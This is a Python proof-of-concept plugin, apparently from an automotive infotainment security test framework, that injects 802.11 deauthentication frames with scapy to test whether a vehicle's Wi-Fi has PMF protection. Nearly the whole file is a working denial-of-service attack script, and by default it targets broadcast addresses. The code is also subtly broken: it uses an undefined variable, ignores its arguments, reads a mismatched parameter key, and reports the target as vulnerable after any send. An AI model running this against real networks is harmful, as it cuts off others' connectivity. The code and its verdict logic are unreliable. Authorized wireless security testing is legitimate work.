"""
PoC Name: WiFi Deauthentication Attack
CVE: N/A
Component: Wireless Stack
Category: Wireless
Severity: Medium
CVSS: 6.5
Description: 发送802.11 Deauth帧测试PMF保护
Prerequisites: 支持Monitor模式和包注入的无线网卡 (如 wlan0mon)，并已安装 scapy。
Usage: python3 32_WiFi_Deauth.py <interface> [target_bssid] [client_mac]
"""
import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin

class WiFiDeauthPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        try:
            import scapy.all as scapy
        except ImportError:
            self.logger.error("未安装scapy工具。请执行: pip install scapy")
            return False
            
        self.interface = self.params.get("interface", "")
        if not self.interface:
            self.logger.error("未指定无线网卡接口 (如 wlan0mon)。请在参数中提供 interface。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"准备执行 Wi-Fi Deauth 攻击，使用网卡: {self.interface}")
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            target_bssid = self.params.get("target_mac", "FF:FF:FF:FF:FF:FF")
            client_mac = self.params.get("client_mac", "FF:FF:FF:FF:FF:FF")
            
            self.logger.info(f"Target BSSID: {target_bssid}")
            self.logger.info(f"Target Client Address: {client_mac}")

            # 构造 802.11 Deauth 帧
            # Reason Code 7: Class 3 frame received from nonassociated STA
            dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            
            self.logger.info("开始发送 Deauth 帧 (安全验证模式，仅尝试 3 次)...")
            try:
                # 持续发送，由于是在演示中，限制次数和频率
                sendp(packet, iface=self.interface, count=3, inter=0.1, verbose=False)
                self.logger.info("发送完毕。")
            except OSError as e:
                self.logger.error(f"设备发送失败，请检查网卡是否支持 Monitor 模式及注入: {str(e)}")
                return {
                    "status": "error",
                    "details": str(e)
                }
                
            self.logger.warning("[!] 如果目标车辆的 Wi-Fi 连接中断，说明未开启 PMF 保护。")
            
            return {
                "status": "success",
                "vulnerable": True,
                "details": "Successfully injected 802.11 Deauth frames. Check target connectivity."
            }

        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "details": str(e)
            }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 32_WiFi_Deauth.py <interface> [target_bssid] [client_mac]")
        sys.exit(1)
    plugin = WiFiDeauthPlugin({"interface": iface})
    plugin.run_verify()
